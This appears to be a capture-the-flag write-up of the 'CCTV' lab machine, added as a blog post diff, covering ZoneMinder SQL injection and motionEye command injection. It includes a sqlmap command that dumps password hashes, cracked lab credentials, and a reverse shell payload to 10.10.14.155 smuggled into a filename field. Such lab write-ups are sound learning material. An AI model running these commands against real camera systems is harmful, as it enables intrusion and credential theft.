@@ -1,0 +1,174 @@
+---
+title: CCTV
+published: 2026-03-12
+toc: true
+draft: false
+tags:
+    - CVE-2024-51428
+    - ZoneMinder
+    - motionEye
+
+---
+
+import PasswordProtect from "~/components/PasswordProtect.client";
+
+```
+Scope:
+10.129.7.4
+```
+# Recon
+## Nmap
+
+```bash
+sudo nmap -sC -sV -sT -p- -Pn -T5 --min-rate=5000 -vvvv cctv.htb
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack Apache httpd 2.4.58
+|_http-title: SecureVision CCTV & Security Solutions
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+<PasswordProtect client:load> 
+
+## 80/TCP - HTTP
+
+Heading over to the web server I find the following:
+
+![](attachments/2f8ca507d2a3a9445d1907bbf6ae6b13.png)
+
+I head over to the **Staff Login** where I'm able to log in with default `admin - admin` creds into the **ZoneMinder** instance:
+
+![](attachments/838557dd13719285fa95af63dfce7dda.png)
+
+![](attachments/7fbf206bdb1542dbf1c13d6846c68943.png)
+
+In the top right corner I notice the version number `1.37.63` which I look up:
+
+![](attachments/20ede10d541f5f837ae12318cb815117.png)
+
+# Exploitation
+## CVE-2024-51482
+
+On [this github page](https://github.com/Gh0s7Ops/CVE-2024-51482-Multi-Stage-Surveillance-System-Exploit) I found the complete guide on how to exploit this instance:
+
+![](attachments/79b67531dd9431c265a6dd4c5b7257c6.png)
+
+We can go ahead and dump the password hash as follows:
+
+```bash
+sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
+    --cookie="ZMSESSID=gkj6fc5hvi63avddv68krtpd1r" \
+    -p tid --dbms=mysql --batch -D zm -T Users --dump
+```
+
+![](attachments/7c56f43833f25812f089abb0a977f614.png)
+
+![](attachments/876c59eb6925db526f2cd2e3f437e655.png)
+
+### john
+
+![](attachments/eab097ef9da2822345a48201b978d2c3.png)
+
+```
+mark
+opensesame
+```
+
+# Foothold
+## SSH as Mark
+
+With the found credentials we can easily log in as *mark*:
+
+![](attachments/f6d1b1451bb7eeb8af5bbd865b941669.png)
+
+In order to fetch the user flag we'll have to move laterally to *sa_mark* however:
+
+![](attachments/cda10ab564ecd7288161ab8fa2984f40.png)
+
+## Enumeration
+
+During enumeration I discover some internally facing ports:
+
+![](attachments/cbd8ff42bad902f4e354db318049c1ff.png)
+
+In order to reach these I go ahead and upload a `ligolo` agent so I can port forward them.
+
+![](attachments/39e7d2043a130c229be94ea3df244919.png)
+
+![](attachments/cd4fef7e4fa3303884cd621274063572.png)
+
+# Privilege Escalation
+## 8765/TCP - HTTP
+
+I can now view the ports such as `8765` which turns out to be the **motionEye** service:
+
+![](attachments/b0e81c1fa7c83afbcc44188fa6b291d7.png)
+
+In order to log in I need some creds, those of *mark* do not work here unfortunately.
+
+I then tried to find the config file inside the file system:
+
+![](attachments/f246a9101a3fb0ff8047798b1df0efc5.png)
+
+While the `motioneye.conf` file wasn't useful, the `motion.conf` was:
+
+![](attachments/ac452ba7387190b32baecd2db1c8ff80.png)
+
+```
+admin
+989c5a8ee87a0e9521ec81a79187d162109282f0
+```
+
+Using a meticulously crafted worlist I am able to retrieve the password:
+
+![](attachments/ef715202753140bc6797ed5ddc4b081f.png)
+
+```
+admin
+X1l9fx1ZjS7RZb
+```
+
+Using this password I can now gain access:
+
+![](attachments/dd4b939c6d6516651b23286003a95d12.png)
+
+We can then exploit this as follows:
+
+![](attachments/aa2f39307ddb22de70e4f3c8d830ab5c.png)
+
+![](attachments/2db7fe3a40987c33b7f5f14e79aac53c.png)
+
+Next up we head on over to the **Still Images** tab where we will use the following reverse shell payload:
+
+```bash
+$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.14.155/443 0>&1\"')").%Y-%m-%d-%H-%M-%S
+```
+
+![](attachments/fb35e3e146abab0cd17a42772dd5b9ad.png)
+
+We then press **Apply** and now we can get the shell by using the following command:
+
+```bash
+curl "http://240.0.0.1:7999/1/action/snapshot"
+```
+
+![](attachments/7a69c5e8c2b3cc610aaeee660ca91d51.png)
+
+![](attachments/90f21cccd2068b875b703d9bb42142fa.png)
+
+### root.txt
+
+![](attachments/36dee0e2eada3df11485cb9ad9668064.png)
+
+### user.txt
+
+![](attachments/1d35caaea4c1f0cdbca00da4718ff17c.png)
+
+![](attachments/bd095fa8ee8252416f5d7ae2b596dc4d.png)
+
+</PasswordProtect>
+
+---
